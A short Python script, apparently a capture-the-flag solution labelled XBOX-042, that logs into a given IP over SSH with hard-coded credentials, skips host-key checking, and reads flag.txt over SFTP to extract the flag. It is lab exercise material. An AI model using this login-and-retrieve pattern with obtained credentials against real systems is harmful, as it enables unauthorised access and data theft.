# coding:utf-8
import paramiko
import re
import sys

"""
@文件命名：XBOX-042
@使用方式: python 042.py <ip地址>
@简述思路: SSH 登录后读取 flag.txt 并匹配 flag 格式
"""


def Scan(ip):
    username = "pedro"
    password = "AHeavySandbag!"
    flag = ""
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip, port=22, username=username, password=password, timeout=10)
        sftp = ssh.open_sftp()
        with sftp.open("flag.txt") as f:
            content = f.read().decode("utf-8")
            match = re.search(r"(flag\{.*?\}|FLAG\{.*?\})", content)
            if match:
                flag = match.group(1)
        sftp.close()
        ssh.close()
    except Exception as e:
        print(f"连接失败: {e}")
    return flag


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("用法: python get_flag.py <ip地址>")
    else:
        print(Scan(sys.argv[1]))
